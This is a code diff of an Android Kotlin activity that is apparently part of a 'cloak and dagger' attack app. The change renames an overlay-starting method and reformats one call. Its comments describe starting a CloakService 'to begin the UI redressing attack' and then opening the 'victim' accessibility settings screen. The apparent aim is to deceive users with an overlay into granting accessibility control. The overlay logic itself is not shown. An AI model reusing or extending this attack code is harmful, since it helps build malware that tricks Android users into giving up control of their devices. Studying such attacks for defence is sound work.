@@ -20,17 +20,19 @@ class MainActivity : AppCompatActivity() {
             val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, appUri)
             startActivityForResult(intent, REQUEST_CODE_OVERLAY)
         } else {
-            startOverlayService()
+            startCloakService()
         }
     }
 
-    private fun startOverlayService() {
+    private fun startCloakService() {
         // No need for the cloak if the dagger already came out
         if (!DaggerService.running) {
-            // Start the topOverlay service to begin the UI redressing attack
+            // Start the cloak service to begin the UI redressing attack
             startService(Intent(this, CloakService::class.java))
             // Launch victim settings activity and close this activity.
-            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
+            val flags = Intent.FLAG_ACTIVITY_NEW_TASK
+            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+                    .setFlags(flags))
             finish()
         }
     }
@@ -39,7 +41,7 @@ class MainActivity : AppCompatActivity() {
 
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         if (requestCode == REQUEST_CODE_OVERLAY && resultCode == Activity.RESULT_OK && !overlayPermissionRequired()) {
-            startOverlayService()
+            startCloakService()
         }
     }
 }
